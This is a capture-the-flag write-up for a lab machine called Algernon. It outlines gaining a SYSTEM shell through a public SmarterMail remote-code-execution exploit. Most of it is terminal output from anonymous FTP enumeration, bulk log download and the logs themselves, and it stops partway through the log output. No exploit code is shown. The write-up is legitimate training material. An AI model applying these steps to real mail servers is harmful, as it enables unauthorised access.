# Algernon
Didn't need to do proper methodology I guess

1. nmap reveals a web server on port 9998, running Smartermail
2. Googling reveals a RCE exploit
3. Testing the LPORTs for the exploit, port 80 works
4. `nt authority/system` shell


# Enumeration

## 21 - FTP

```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.225.65                                                                                                                                              1 ⚙
Connected to 192.168.225.65.
220 Microsoft FTP Service
Name (192.168.225.65:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
04-29-20  09:31PM       <DIR>          ImapRetrieval
01-17-22  03:41AM       <DIR>          Logs
04-29-20  09:31PM       <DIR>          PopRetrieval
04-29-20  09:32PM       <DIR>          Spool
226 Transfer complete.
ftp> cd ImapRetrieval
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> cd ../Logs
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
04-29-20  10:26PM                  582 2020.04.29-delivery.log
04-29-20  10:15PM                    0 2020.04.29-profiler.log
04-29-20  10:26PM                  208 2020.04.29-smtpLog.log
04-29-20  10:26PM                  300 2020.04.29-xmppLog.log
05-12-20  02:36AM                  504 2020.05.12-administrative.log
05-12-20  02:36AM                  699 2020.05.12-delivery.log
05-12-20  01:06AM                    0 2020.05.12-profiler.log
05-12-20  02:36AM                  306 2020.05.12-smtpLog.log
05-12-20  02:36AM                  444 2020.05.12-xmppLog.log
05-13-20  02:46AM                  233 2020.05.13-delivery.log
05-13-20  02:47AM                    0 2020.05.13-profiler.log
05-13-20  02:46AM                  102 2020.05.13-smtpLog.log
05-13-20  02:46AM                  148 2020.05.13-xmppLog.log
05-15-20  12:16AM                  163 2020.05.15-delivery.log
05-15-20  12:16AM                    0 2020.05.15-profiler.log
05-15-20  12:16AM                  102 2020.05.15-smtpLog.log
05-15-20  12:16AM                  148 2020.05.15-xmppLog.log
05-27-20  07:45PM                  233 2020.05.27-delivery.log
05-27-20  07:45PM                    0 2020.05.27-profiler.log
05-27-20  07:45PM                  102 2020.05.27-smtpLog.log
05-27-20  07:45PM                  148 2020.05.27-xmppLog.log
06-01-20  05:51PM                  161 2020.06.01-delivery.log
06-01-20  05:51PM                    0 2020.06.01-profiler.log
06-01-20  05:51PM                  100 2020.06.01-smtpLog.log
06-01-20  05:51PM                  146 2020.06.01-xmppLog.log
07-09-20  11:48AM                  163 2020.07.09-delivery.log
07-09-20  11:48AM                    0 2020.07.09-profiler.log
07-09-20  11:48AM                  102 2020.07.09-smtpLog.log
07-09-20  11:48AM                  148 2020.07.09-xmppLog.log
07-12-20  07:58AM                  104 2020.07.12-delivery.log
07-12-20  07:58AM                    0 2020.07.12-profiler.log
07-12-20  07:58AM                  102 2020.07.12-smtpLog.log
07-12-20  07:58AM                  148 2020.07.12-xmppLog.log
07-28-20  04:00AM                  163 2020.07.28-delivery.log
07-28-20  04:00AM                    0 2020.07.28-profiler.log
07-28-20  04:00AM                  102 2020.07.28-smtpLog.log
07-28-20  04:00AM                  148 2020.07.28-xmppLog.log
08-12-20  02:12PM                  174 2020.08.12-delivery.log
08-12-20  02:12PM                  358 2020.08.12-imapLog.log
08-12-20  02:12PM                  358 2020.08.12-popLog.log
08-12-20  02:12PM                  409 2020.08.12-smtpLog.log
08-12-20  02:12PM                  456 2020.08.12-xmppLog.log
03-10-21  11:12AM                  175 2021.03.10-delivery.log
03-10-21  11:12AM                  358 2021.03.10-imapLog.log
03-10-21  11:12AM                  358 2021.03.10-popLog.log
03-10-21  11:12AM                  410 2021.03.10-smtpLog.log
03-10-21  11:12AM                  457 2021.03.10-xmppLog.log
01-17-22  03:41AM                  559 2022.01.17-administrative.log
01-17-22  03:36AM                  112 2022.01.17-delivery.log
226 Transfer complete.
ftp> cd ../PopRetrieval
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> cd ../Spool
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
04-29-20  09:32PM       <DIR>          Drop
226 Transfer complete.
ftp> cd Drop
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> 
```

### Transferring Logs

```
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Algernon/ftp_files]
└─$ ftp 192.168.225.65                                                                                                                                              1 ⚙
Connected to 192.168.225.65.
220 Microsoft FTP Service
Name (192.168.225.65:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
04-29-20  09:31PM       <DIR>          ImapRetrieval
01-17-22  03:41AM       <DIR>          Logs
04-29-20  09:31PM       <DIR>          PopRetrieval
04-29-20  09:32PM       <DIR>          Spool
226 Transfer complete.
ftp> cd Logs
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
04-29-20  10:26PM                  582 2020.04.29-delivery.log
04-29-20  10:15PM                    0 2020.04.29-profiler.log
04-29-20  10:26PM                  208 2020.04.29-smtpLog.log
04-29-20  10:26PM                  300 2020.04.29-xmppLog.log
05-12-20  02:36AM                  504 2020.05.12-administrative.log
05-12-20  02:36AM                  699 2020.05.12-delivery.log
05-12-20  01:06AM                    0 2020.05.12-profiler.log
05-12-20  02:36AM                  306 2020.05.12-smtpLog.log
05-12-20  02:36AM                  444 2020.05.12-xmppLog.log
05-13-20  02:46AM                  233 2020.05.13-delivery.log
05-13-20  02:47AM                    0 2020.05.13-profiler.log
05-13-20  02:46AM                  102 2020.05.13-smtpLog.log
05-13-20  02:46AM                  148 2020.05.13-xmppLog.log
05-15-20  12:16AM                  163 2020.05.15-delivery.log
05-15-20  12:16AM                    0 2020.05.15-profiler.log
05-15-20  12:16AM                  102 2020.05.15-smtpLog.log
05-15-20  12:16AM                  148 2020.05.15-xmppLog.log
05-27-20  07:45PM                  233 2020.05.27-delivery.log
05-27-20  07:45PM                    0 2020.05.27-profiler.log
05-27-20  07:45PM                  102 2020.05.27-smtpLog.log
05-27-20  07:45PM                  148 2020.05.27-xmppLog.log
06-01-20  05:51PM                  161 2020.06.01-delivery.log
06-01-20  05:51PM                    0 2020.06.01-profiler.log
06-01-20  05:51PM                  100 2020.06.01-smtpLog.log
06-01-20  05:51PM                  146 2020.06.01-xmppLog.log
07-09-20  11:48AM                  163 2020.07.09-delivery.log
07-09-20  11:48AM                    0 2020.07.09-profiler.log
07-09-20  11:48AM                  102 2020.07.09-smtpLog.log
07-09-20  11:48AM                  148 2020.07.09-xmppLog.log
07-12-20  07:58AM                  104 2020.07.12-delivery.log
07-12-20  07:58AM                    0 2020.07.12-profiler.log
07-12-20  07:58AM                  102 2020.07.12-smtpLog.log
07-12-20  07:58AM                  148 2020.07.12-xmppLog.log
07-28-20  04:00AM                  163 2020.07.28-delivery.log
07-28-20  04:00AM                    0 2020.07.28-profiler.log
07-28-20  04:00AM                  102 2020.07.28-smtpLog.log
07-28-20  04:00AM                  148 2020.07.28-xmppLog.log
08-12-20  02:12PM                  174 2020.08.12-delivery.log
08-12-20  02:12PM                  358 2020.08.12-imapLog.log
08-12-20  02:12PM                  358 2020.08.12-popLog.log
08-12-20  02:12PM                  409 2020.08.12-smtpLog.log
08-12-20  02:12PM                  456 2020.08.12-xmppLog.log
03-10-21  11:12AM                  175 2021.03.10-delivery.log
03-10-21  11:12AM                  358 2021.03.10-imapLog.log
03-10-21  11:12AM                  358 2021.03.10-popLog.log
03-10-21  11:12AM                  410 2021.03.10-smtpLog.log
03-10-21  11:12AM                  457 2021.03.10-xmppLog.log
01-17-22  04:09AM                 1118 2022.01.17-administrative.log
01-17-22  03:36AM                  112 2022.01.17-delivery.log
226 Transfer complete.
ftp> mget *
mget 2020.04.29-delivery.log? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
582 bytes received in 0.28 secs (2.0054 kB/s)
mget 2020.04.29-profiler.log? A
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
mget 2020.04.29-smtpLog.log? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
208 bytes received in 0.28 secs (0.7251 kB/s)
mget 2020.04.29-xmppLog.log? ^C
Continue with mget? n
ftp> prompt
Interactive mode off.
ftp> mget *
local: 2020.04.29-delivery.log remote: 2020.04.29-delivery.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
582 bytes received in 0.28 secs (2.0467 kB/s)
local: 2020.04.29-profiler.log remote: 2020.04.29-profiler.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
local: 2020.04.29-smtpLog.log remote: 2020.04.29-smtpLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
208 bytes received in 0.28 secs (0.7287 kB/s)
local: 2020.04.29-xmppLog.log remote: 2020.04.29-xmppLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
300 bytes received in 0.31 secs (0.9353 kB/s)
local: 2020.05.12-administrative.log remote: 2020.05.12-administrative.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
504 bytes received in 0.28 secs (1.7550 kB/s)
local: 2020.05.12-delivery.log remote: 2020.05.12-delivery.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
699 bytes received in 0.29 secs (2.3824 kB/s)
local: 2020.05.12-profiler.log remote: 2020.05.12-profiler.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
local: 2020.05.12-smtpLog.log remote: 2020.05.12-smtpLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
306 bytes received in 0.33 secs (0.9146 kB/s)
local: 2020.05.12-xmppLog.log remote: 2020.05.12-xmppLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
444 bytes received in 0.28 secs (1.5383 kB/s)
local: 2020.05.13-delivery.log remote: 2020.05.13-delivery.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
233 bytes received in 0.28 secs (0.8207 kB/s)
local: 2020.05.13-profiler.log remote: 2020.05.13-profiler.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
local: 2020.05.13-smtpLog.log remote: 2020.05.13-smtpLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
102 bytes received in 0.28 secs (0.3592 kB/s)
local: 2020.05.13-xmppLog.log remote: 2020.05.13-xmppLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
148 bytes received in 0.29 secs (0.4979 kB/s)
local: 2020.05.15-delivery.log remote: 2020.05.15-delivery.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
163 bytes received in 0.28 secs (0.5786 kB/s)
local: 2020.05.15-profiler.log remote: 2020.05.15-profiler.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
local: 2020.05.15-smtpLog.log remote: 2020.05.15-smtpLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
102 bytes received in 0.27 secs (0.3644 kB/s)
local: 2020.05.15-xmppLog.log remote: 2020.05.15-xmppLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
148 bytes received in 0.28 secs (0.5140 kB/s)
local: 2020.05.27-delivery.log remote: 2020.05.27-delivery.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
233 bytes received in 0.30 secs (0.7528 kB/s)
local: 2020.05.27-profiler.log remote: 2020.05.27-profiler.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
local: 2020.05.27-smtpLog.log remote: 2020.05.27-smtpLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
102 bytes received in 0.29 secs (0.3473 kB/s)
local: 2020.05.27-xmppLog.log remote: 2020.05.27-xmppLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
148 bytes received in 0.28 secs (0.5207 kB/s)
local: 2020.06.01-delivery.log remote: 2020.06.01-delivery.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
161 bytes received in 0.27 secs (0.5736 kB/s)
local: 2020.06.01-profiler.log remote: 2020.06.01-profiler.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
local: 2020.06.01-smtpLog.log remote: 2020.06.01-smtpLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
100 bytes received in 0.31 secs (0.3196 kB/s)
local: 2020.06.01-xmppLog.log remote: 2020.06.01-xmppLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
146 bytes received in 0.29 secs (0.4960 kB/s)
local: 2020.07.09-delivery.log remote: 2020.07.09-delivery.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
163 bytes received in 0.29 secs (0.5580 kB/s)
local: 2020.07.09-profiler.log remote: 2020.07.09-profiler.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
local: 2020.07.09-smtpLog.log remote: 2020.07.09-smtpLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
102 bytes received in 0.28 secs (0.3523 kB/s)
local: 2020.07.09-xmppLog.log remote: 2020.07.09-xmppLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
148 bytes received in 0.28 secs (0.5174 kB/s)
local: 2020.07.12-delivery.log remote: 2020.07.12-delivery.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
104 bytes received in 0.31 secs (0.3323 kB/s)
local: 2020.07.12-profiler.log remote: 2020.07.12-profiler.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
local: 2020.07.12-smtpLog.log remote: 2020.07.12-smtpLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
102 bytes received in 0.29 secs (0.3486 kB/s)
local: 2020.07.12-xmppLog.log remote: 2020.07.12-xmppLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
148 bytes received in 0.29 secs (0.5045 kB/s)
local: 2020.07.28-delivery.log remote: 2020.07.28-delivery.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
163 bytes received in 0.28 secs (0.5735 kB/s)
local: 2020.07.28-profiler.log remote: 2020.07.28-profiler.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
local: 2020.07.28-smtpLog.log remote: 2020.07.28-smtpLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
102 bytes received in 0.32 secs (0.3118 kB/s)
local: 2020.07.28-xmppLog.log remote: 2020.07.28-xmppLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
148 bytes received in 0.28 secs (0.5204 kB/s)
local: 2020.08.12-delivery.log remote: 2020.08.12-delivery.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
174 bytes received in 0.29 secs (0.5950 kB/s)
local: 2020.08.12-imapLog.log remote: 2020.08.12-imapLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
358 bytes received in 0.28 secs (1.2702 kB/s)
local: 2020.08.12-popLog.log remote: 2020.08.12-popLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
358 bytes received in 0.28 secs (1.2426 kB/s)
local: 2020.08.12-smtpLog.log remote: 2020.08.12-smtpLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
409 bytes received in 0.29 secs (1.4008 kB/s)
local: 2020.08.12-xmppLog.log remote: 2020.08.12-xmppLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
456 bytes received in 0.29 secs (1.5278 kB/s)
local: 2021.03.10-delivery.log remote: 2021.03.10-delivery.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
175 bytes received in 0.29 secs (0.5951 kB/s)
local: 2021.03.10-imapLog.log remote: 2021.03.10-imapLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
358 bytes received in 0.32 secs (1.0966 kB/s)
local: 2021.03.10-popLog.log remote: 2021.03.10-popLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
358 bytes received in 0.29 secs (1.2202 kB/s)
local: 2021.03.10-smtpLog.log remote: 2021.03.10-smtpLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
410 bytes received in 0.28 secs (1.4527 kB/s)
local: 2021.03.10-xmppLog.log remote: 2021.03.10-xmppLog.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
457 bytes received in 0.28 secs (1.5875 kB/s)
local: 2022.01.17-administrative.log remote: 2022.01.17-administrative.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1118 bytes received in 0.28 secs (3.8882 kB/s)
local: 2022.01.17-delivery.log remote: 2022.01.17-delivery.log
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
112 bytes received in 0.30 secs (0.3705 kB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Algernon/ftp_files]
└─$ ls                                                                                                                                                              1 ⚙
2020.04.29-delivery.log        2020.05.13-delivery.log  2020.05.27-profiler.log  2020.07.09-smtpLog.log   2020.07.28-xmppLog.log   2021.03.10-smtpLog.log
2020.04.29-profiler.log        2020.05.13-profiler.log  2020.05.27-smtpLog.log   2020.07.09-xmppLog.log   2020.08.12-delivery.log  2021.03.10-xmppLog.log
2020.04.29-smtpLog.log         2020.05.13-smtpLog.log   2020.05.27-xmppLog.log   2020.07.12-delivery.log  2020.08.12-imapLog.log   2022.01.17-administrative.log
2020.04.29-xmppLog.log         2020.05.13-xmppLog.log   2020.06.01-delivery.log  2020.07.12-profiler.log  2020.08.12-popLog.log    2022.01.17-delivery.log
2020.05.12-administrative.log  2020.05.15-delivery.log  2020.06.01-profiler.log  2020.07.12-smtpLog.log   2020.08.12-smtpLog.log
2020.05.12-delivery.log        2020.05.15-profiler.log  2020.06.01-smtpLog.log   2020.07.12-xmppLog.log   2020.08.12-xmppLog.log
2020.05.12-profiler.log        2020.05.15-smtpLog.log   2020.06.01-xmppLog.log   2020.07.28-delivery.log  2021.03.10-delivery.log
2020.05.12-smtpLog.log         2020.05.15-xmppLog.log   2020.07.09-delivery.log  2020.07.28-profiler.log  2021.03.10-imapLog.log
2020.05.12-xmppLog.log         2020.05.27-delivery.log  2020.07.09-profiler.log  2020.07.28-smtpLog.log   2021.03.10-popLog.log
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Algernon/ftp_files]
└─$ la -al                                                                                                                                                          1 ⚙
total 28
drwxrwxrwx 1 root root  328 Jan 17 07:15 .
drwxrwxrwx 1 root root  496 Jan 17 07:02 ..
-rwxrwxrwx 1 root root  572 Jan 17 07:14 2020.04.29-delivery.log
-rwxrwxrwx 1 root root    0 Jan 17 07:14 2020.04.29-profiler.log
-rwxrwxrwx 1 root root  204 Jan 17 07:14 2020.04.29-smtpLog.log
-rwxrwxrwx 1 root root  294 Jan 17 07:14 2020.04.29-xmppLog.log
-rwxrwxrwx 1 root root  497 Jan 17 07:14 2020.05.12-administrative.log
-rwxrwxrwx 1 root root  687 Jan 17 07:14 2020.05.12-delivery.log
-rwxrwxrwx 1 root root    0 Jan 17 07:14 2020.05.12-profiler.log
-rwxrwxrwx 1 root root  300 Jan 17 07:14 2020.05.12-smtpLog.log
-rwxrwxrwx 1 root root  435 Jan 17 07:14 2020.05.12-xmppLog.log
-rwxrwxrwx 1 root root  229 Jan 17 07:14 2020.05.13-delivery.log
-rwxrwxrwx 1 root root    0 Jan 17 07:14 2020.05.13-profiler.log
-rwxrwxrwx 1 root root  100 Jan 17 07:14 2020.05.13-smtpLog.log
-rwxrwxrwx 1 root root  145 Jan 17 07:14 2020.05.13-xmppLog.log
-rwxrwxrwx 1 root root  160 Jan 17 07:14 2020.05.15-delivery.log
-rwxrwxrwx 1 root root    0 Jan 17 07:14 2020.05.15-profiler.log
-rwxrwxrwx 1 root root  100 Jan 17 07:14 2020.05.15-smtpLog.log
-rwxrwxrwx 1 root root  145 Jan 17 07:14 2020.05.15-xmppLog.log
-rwxrwxrwx 1 root root  229 Jan 17 07:14 2020.05.27-delivery.log
-rwxrwxrwx 1 root root    0 Jan 17 07:14 2020.05.27-profiler.log
-rwxrwxrwx 1 root root  100 Jan 17 07:14 2020.05.27-smtpLog.log
-rwxrwxrwx 1 root root  145 Jan 17 07:14 2020.05.27-xmppLog.log
-rwxrwxrwx 1 root root  158 Jan 17 07:14 2020.06.01-delivery.log
-rwxrwxrwx 1 root root    0 Jan 17 07:14 2020.06.01-profiler.log
-rwxrwxrwx 1 root root   98 Jan 17 07:14 2020.06.01-smtpLog.log
-rwxrwxrwx 1 root root  143 Jan 17 07:14 2020.06.01-xmppLog.log
-rwxrwxrwx 1 root root  160 Jan 17 07:14 2020.07.09-delivery.log
-rwxrwxrwx 1 root root    0 Jan 17 07:15 2020.07.09-profiler.log
-rwxrwxrwx 1 root root  100 Jan 17 07:15 2020.07.09-smtpLog.log
-rwxrwxrwx 1 root root  145 Jan 17 07:15 2020.07.09-xmppLog.log
-rwxrwxrwx 1 root root  102 Jan 17 07:15 2020.07.12-delivery.log
-rwxrwxrwx 1 root root    0 Jan 17 07:15 2020.07.12-profiler.log
-rwxrwxrwx 1 root root  100 Jan 17 07:15 2020.07.12-smtpLog.log
-rwxrwxrwx 1 root root  145 Jan 17 07:15 2020.07.12-xmppLog.log
-rwxrwxrwx 1 root root  160 Jan 17 07:15 2020.07.28-delivery.log
-rwxrwxrwx 1 root root    0 Jan 17 07:15 2020.07.28-profiler.log
-rwxrwxrwx 1 root root  100 Jan 17 07:15 2020.07.28-smtpLog.log
-rwxrwxrwx 1 root root  145 Jan 17 07:15 2020.07.28-xmppLog.log
-rwxrwxrwx 1 root root  171 Jan 17 07:15 2020.08.12-delivery.log
-rwxrwxrwx 1 root root  354 Jan 17 07:15 2020.08.12-imapLog.log
-rwxrwxrwx 1 root root  354 Jan 17 07:15 2020.08.12-popLog.log
-rwxrwxrwx 1 root root  404 Jan 17 07:15 2020.08.12-smtpLog.log
-rwxrwxrwx 1 root root  451 Jan 17 07:15 2020.08.12-xmppLog.log
-rwxrwxrwx 1 root root  172 Jan 17 07:15 2021.03.10-delivery.log
-rwxrwxrwx 1 root root  354 Jan 17 07:15 2021.03.10-imapLog.log
-rwxrwxrwx 1 root root  354 Jan 17 07:15 2021.03.10-popLog.log
-rwxrwxrwx 1 root root  405 Jan 17 07:15 2021.03.10-smtpLog.log
-rwxrwxrwx 1 root root  452 Jan 17 07:15 2021.03.10-xmppLog.log
-rwxrwxrwx 1 root root 1106 Jan 17 07:15 2022.01.17-administrative.log
-rwxrwxrwx 1 root root  110 Jan 17 07:15 2022.01.17-delivery.log
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Algernon/ftp_files]
└─$ cat *                                                                                                                                                           1 ⚙
22:31:35.613 Delivery server started at 4/29/2020 10:31:35 PM
22:31:35.692 Updating ClamAV database...
22:32:23.254 Updating the ClamAV database has completed successfully
22:32:23.254 Updating ClamAV database...
22:35:18.910 Updating the ClamAV database has completed successfully
23:15:58.747 Relay server stopped at 4/29/2020 11:15:58 PM
23:16:47.621 Delivery server started at 4/29/2020 11:16:47 PM
23:16:47.652 Updating ClamAV database...
23:18:05.980 Updating the ClamAV database has completed successfully
23:26:56.915 Relay server stopped at 4/29/2020 11:26:56 PM
22:31:35.551 smtp started at 4/29/2020 10:31:35 PM
23:15:58.747 smtp stopped at 4/29/2020 11:15:58 PM
23:16:47.589 smtp started at 4/29/2020 11:16:47 PM
23:26:56.915 smtp stopped at 4/29/2020 11:26:56 PM
22:31:35.863 xmpp Started at 4/29/2020 10:31:35 PM
23:15:58.763 All Xmpp Connections terminated
23:15:58.794 xmpp Stopped at 4/29/2020 11:15:58 PM
23:16:47.746 xmpp Started at 4/29/2020 11:16:47 PM
23:26:56.962 All Xmpp Connections terminated
23:26:57.040 xmpp Stopped at 4/29/2020 11:26:57 PM
03:35:45.726 [192.168.118.6] User @ calling create primary system admin, username: admin
03:35:47.054 [192.168.118.6] Webmail Attempting to login user: admin
03:35:47.054 [192.168.118.6] Webmail Login successful: With user admin
03:35:55.820 [192.168.118.6] Webmail Attempting to login user: admin
03:35:55.820 [192.168.118.6] Webmail Login successful: With user admin
03:36:00.195 [192.168.118.6] User admin@ calling set setup wizard settings
03:36:08.242 [192.168.118.6] User admin@ logging out
01:55:55.110 Delivery server started at 5/12/2020 1:55:55 AM
01:55:55.141 Updating ClamAV database...
01:59:39.891 Updating the ClamAV database has completed successfully
02:06:07.836 Relay server stopped at 5/12/2020 2:06:07 AM
02:06:50.919 Delivery server started at 5/12/2020 2:06:50 AM
02:06:50.966 Updating ClamAV database...
02:08:59.539 Updating the ClamAV database has completed successfully
02:51:39.514 Relay server stopped at 5/12/2020 2:51:39 AM
03:33:25.570 Delivery server started at 5/12/2020 3:33:25 AM
03:33:25.586 Updating ClamAV database...
03:34:40.617 Updating the ClamAV database has completed successfully
03:36:34.976 Relay server stopped at 5/12/2020 3:36:34 AM
01:55:55.079 smtp started at 5/12/2020 1:55:55 AM
02:06:07.836 smtp stopped at 5/12/2020 2:06:07 AM
02:06:50.888 smtp started at 5/12/2020 2:06:50 AM
02:51:39.514 smtp stopped at 5/12/2020 2:51:39 AM
03:33:25.539 smtp started at 5/12/2020 3:33:25 AM
03:36:34.976 smtp stopped at 5/12/2020 3:36:34 AM
01:55:55.220 xmpp Started at 5/12/2020 1:55:55 AM
02:06:07.911 All Xmpp Connections terminated
02:06:07.974 xmpp Stopped at 5/12/2020 2:06:07 AM
02:06:51.091 xmpp Started at 5/12/2020 2:06:51 AM
02:51:39.545 All Xmpp Connections terminated
02:51:39.639 xmpp Stopped at 5/12/2020 2:51:39 AM
03:33:25.679 xmpp Started at 5/12/2020 3:33:25 AM
03:36:35.086 All Xmpp Connections terminated
03:36:35.086 xmpp Stopped at 5/12/2020 3:36:35 AM
03:41:48.211 Delivery server started at 5/13/2020 3:41:48 AM
03:41:48.227 Updating ClamAV database...
03:46:57.468 Updating the ClamAV database has completed successfully
03:46:59.312 Relay server stopped at 5/13/2020 3:46:59 AM
03:41:48.180 smtp started at 5/13/2020 3:41:48 AM
03:46:59.297 smtp stopped at 5/13/2020 3:46:59 AM
03:41:48.321 xmpp Started at 5/13/2020 3:41:48 AM
03:46:59.343 All Xmpp Connections terminated
03:46:59.375 xmpp Stopped at 5/13/2020 3:46:59 AM
01:13:26.766 Delivery server started at 5/15/2020 1:13:26 AM
01:13:26.813 Updating ClamAV database...
01:16:24.360 Relay server stopped at 5/15/2020 1:16:24 AM
01:13:26.688 smtp started at 5/15/2020 1:13:26 AM
01:16:24.157 smtp stopped at 5/15/2020 1:16:24 AM
01:13:27.016 xmpp Started at 5/15/2020 1:13:27 AM
01:16:24.625 All Xmpp Connections terminated
01:16:24.735 xmpp Stopped at 5/15/2020 1:16:24 AM
20:30:57.912 Delivery server started at 5/27/2020 8:30:57 PM
20:30:57.974 Updating ClamAV database...
20:36:26.373 Updating the ClamAV database has completed successfully
20:45:32.750 Relay server stopped at 5/27/2020 8:45:32 PM
20:30:57.849 smtp started at 5/27/2020 8:30:57 PM
20:45:32.735 smtp stopped at 5/27/2020 8:45:32 PM
20:30:58.178 xmpp Started at 5/27/2020 8:30:58 PM
20:45:32.766 All Xmpp Connections terminated
20:45:32.813 xmpp Stopped at 5/27/2020 8:45:32 PM
18:46:52.002 Delivery server started at 6/1/2020 6:46:52 PM
18:46:52.034 Updating ClamAV database...
18:51:32.867 Relay server stopped at 6/1/2020 6:51:32 PM
18:46:51.971 smtp started at 6/1/2020 6:46:51 PM
18:51:32.758 smtp stopped at 6/1/2020 6:51:32 PM
18:46:52.143 xmpp Started at 6/1/2020 6:46:52 PM
18:51:32.930 All Xmpp Connections terminated
18:51:32.961 xmpp Stopped at 6/1/2020 6:51:32 PM
12:44:58.027 Delivery server started at 7/9/2020 12:44:58 PM
12:44:58.058 Updating ClamAV database...
12:48:00.177 Relay server stopped at 7/9/2020 12:48:00 PM
12:44:57.995 smtp started at 7/9/2020 12:44:57 PM
12:47:59.927 smtp stopped at 7/9/2020 12:47:59 PM
12:44:58.167 xmpp Started at 7/9/2020 12:44:58 PM
12:48:00.256 All Xmpp Connections terminated
12:48:00.381 xmpp Stopped at 7/9/2020 12:48:00 PM
08:58:08.836 Delivery server started at 7/12/2020 8:58:08 AM
08:58:08.867 Updating ClamAV database...
08:58:08.789 smtp started at 7/12/2020 8:58:08 AM
08:58:19.101 smtp stopped at 7/12/2020 8:58:19 AM
08:58:08.961 xmpp Started at 7/12/2020 8:58:08 AM
08:58:19.148 All Xmpp Connections terminated
08:58:19.195 xmpp Stopped at 7/12/2020 8:58:19 AM
04:57:46.017 Delivery server started at 7/28/2020 4:57:46 AM
04:57:46.064 Updating ClamAV database...
05:00:34.736 Relay server stopped at 7/28/2020 5:00:34 AM
04:57:45.986 smtp started at 7/28/2020 4:57:45 AM
05:00:34.596 smtp stopped at 7/28/2020 5:00:34 AM
